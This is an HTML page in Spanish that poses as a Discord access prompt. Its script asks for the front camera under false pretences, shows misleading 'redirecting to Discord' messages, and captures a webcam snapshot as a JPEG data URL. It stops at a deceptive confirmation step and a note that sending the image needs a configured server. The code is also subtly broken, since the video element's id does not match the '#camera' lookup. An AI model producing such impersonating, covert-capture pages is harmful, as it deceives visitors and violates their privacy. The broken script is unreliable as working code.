<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>quieres acceder?</title>
<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  min-height: 100vh;
  display: grid;
  place-items: center;
  padding: 16px;
  background: #fff;
  color: #111;
  font-family: Arial, sans-serif;
}

main {
  width: 100%;
  max-width: 300px;
  padding: 18px;
  border: 1px solid #ddd;
  border-radius: 8px;
}

h2 {
  margin: 0 0 8px;
  font-size: 18px;
}

p {
  font-size: 13px;
  line-height: 1.5;
  color: #444;
}

button {
  width: 100%;
  padding: 11px;
  margin-top: 8px;
  background: #111;
  color: white;
  border: 0;
  border-radius: 5px;
  font-size: 14px;
  cursor: pointer;
}

video, img {
  width: 100%;
  margin-top: 12px;
  border-radius: 5px;
}

[hidden] { display: none !important; }
</style>
</head>
<body>
<main>
  <h2>quieres acceder?</h2>
  <p>
  Quieres acceder a este sitio web de Discord?
  </p>

  <button id="allow">Permitir</button>
  <video id="" autoplay playsinline hidden></video>
  <img id="preview" alt="discord" hidden>
  <p id="status" role="status"></p>
</main>

<script>
const button = document.querySelector("#allow");
const camera = document.querySelector("#camera");
const preview = document.querySelector("#preview");
const status = document.querySelector("#status");

let stream;

button.addEventListener("click", async () => {
  if (!stream) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      camera.srcObject = stream;
      camera.hidden = false;
      button.textContent = "discord.com acceder";
      status.textContent =
        "Redirigiendo a Discord.";
      return;
    } catch {
      status.textContent =
        "No se pudo abrir Discord. Comprueba los permisos del navegador.";
      return;
    }
  }

  if (button.dataset.confirm !== "yes") {
    if (!camera.videoWidth) {
      status.textContent = "Entrando a Discord.";
      return;
    }

    const canvas = document.createElement("canvas");
    canvas.width = camera.videoWidth;
    canvas.height = camera.videoHeight;
    canvas.getContext("2d").drawImage(
      camera, 0, 0, canvas.width, canvas.height
    );

    preview.src = canvas.toDataURL("image/jpeg", 0.85);
    preview.hidden = false;
    button.textContent = "Vas a salir de tu navegador, estás seguro?";
    button.dataset.confirm = "yes";
    status.textContent =
      "Confirmar salir de tu navegador?";
    return;
  }

  button.disabled = true;
  status.textContent = "El envío requiere un servidor configurado.";
  button.disabled = false;
});
</script>
</body>
</html>
